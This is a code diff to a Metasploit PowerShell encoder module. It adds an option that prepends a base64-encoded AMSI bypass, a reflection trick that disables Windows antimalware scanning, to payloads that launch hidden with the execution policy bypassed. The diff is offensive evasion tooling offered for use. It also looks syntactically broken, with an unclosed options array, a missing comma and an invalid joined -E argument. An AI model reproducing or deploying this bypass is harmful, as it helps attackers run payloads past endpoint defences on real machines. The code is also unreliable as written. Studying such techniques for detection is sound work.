@@ -5,17 +5,16 @@ class MetasploitModule < Msf::Encoder
     super(
       'Name'             => 'Powershell Base64 Script Encoder',
       'Description'      => %q{
-        PowerShell script base64 encoded and obfuscated.
+        PowerShell script base64 encoded and included with AMSI bypass code.
       },
-      'Author'           => 'Pr0xy bl4d3',
+      'Author'           => 'GetRektBoy724',
       'Arch'             => ARCH_CMD,
       'Platform'         => 'win')
  
     register_options([
       OptBool.new('NOEXIT', [ false, 'Add -noexit option', false ]),
       OptBool.new('SYSWOW64', [ false, 'Call syswow64 powershell', false ])
-    ])
- 
+      OptBool.new('AMSIBYPASS', [ false, 'Add a code for bypassing AMSI', false ])
   end
  
   def encode_block(state, buf)
@@ -27,8 +26,12 @@ class MetasploitModule < Msf::Encoder
       cmd += 'powershell.exe '
     end
     if datastore['NOEXIT']
-      cmd += '-W Hidden -nop -ExecutionPolicy Bypass -NoExit '
+      cmd += '-W Hidden -nop -ep bypass -NoExit '
     end
-    cmd += "-EncodedCommand #{base64}"
+    if datastore['AMSIBYPASS']
+      cmd += "-E WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwAgACsAIAAnAFUAdABpAGwAcwAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkAJwAgACsAIAAnAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA=;#{base64}"
+    else
+      cmd += "-E #{base64}"
+    end
   end
 end
